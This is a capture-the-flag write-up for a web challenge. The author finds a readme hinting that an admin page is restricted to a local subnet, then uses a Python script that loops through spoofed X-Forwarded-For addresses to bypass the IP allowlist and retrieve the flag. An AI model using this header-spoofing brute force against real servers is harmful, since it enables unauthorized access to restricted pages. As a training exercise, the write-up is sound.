# WH01
## BRIEFING
Access the site at https://cfta-wh01.allyourbases.co and find a way to get the flag from the CMS.

## Solution

This one escaped me during the competition as the usual tools (`gobuster`, `dirbuster`, `dirb`) I use to enumerate directories on a website did not seem to work, either not at all or not in any reasonable amount of time. Apparently [dirsearch](https://github.com/maurosoria/dirsearch) was necessary to find the valid extensions. I don't doubt that there are other methods or tools, but I was surprised that `dirsearch` found them while my go-to tools did not. In any case if we download and run `dirsearch` on the target domain we quickly get the hits we're looking for:

```console
[17:53:18] 304 -    0B  - /admin.html
[17:53:51] 200 -  616B  - /index.html
[17:54:08] 200 -  154B  - /readme.txt
[17:54:11] 400 -  371B  - /servlet/%C0%AE%C0%AE%C0%AF
[17:54:13] 200 -    0B  - /soap/
```

If we go to `/readme.txt` we find the text:

```
To use the CMS make sure to visit /admin.html from allowed IPs on the local network.

Note: Tell engineering to stop moving the subnet from 192.168.0.0/24
```

This hint is a golden ticket: We need to access `/admin.html` from a machine on the 192.168.0.0/24 subnet. That essentially means we need to send a GET request to `/admin.html` with a spoofed IP address of the form 192.168.0.X where X is in the range 1 to 255. In our request we will need to make use of the `X-Forwarded-For` header to identify the spoofed IP. The `X-Forwarded-For` (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer.

I made the following script:

```py3
import requests

TARGET_URL = 'https://cfta-wh01.allyourbases.co/admin.html'
FORBIDDEN = 304

for i in range(1,256):
    ip = '192.168.0.{}'.format(i)
    headers = {'X-Forwarded-For': ip}
    r = requests.get(TARGET_URL, headers=headers)
    if r.status_code != FORBIDDEN:
        print(r.text)
        print('Accessed via: {}'.format(ip))
        break
```

Running it, we find that the correct IP to spoof was 192.168.0.62 and we get the flag.

```console
root@osboxes:~/Downloads/wh01# python3 solve.py 
<!DOCTYPE html>

<html lang="en">
<head>
    <title>My Blog</title>
    <link rel="stylesheet" href="mysite.css">
</head>
<body>
<div class="main">
    <div class="center">
        <div class="header">
            <h1>Admin</h1>
        </div>
        <div class="content flag">
            <h2>Flag</h2>
            iPSpooFinGWiThHopHeaDers91918
        </div>
        <div class="footer">
            Powered By: mycustomcms 2021
        </div>
    </div>
</div>
</body>
</html>


Accessed via: 192.168.0.62
```

The flag is **iPSpooFinGWiThHopHeaDers91918**.
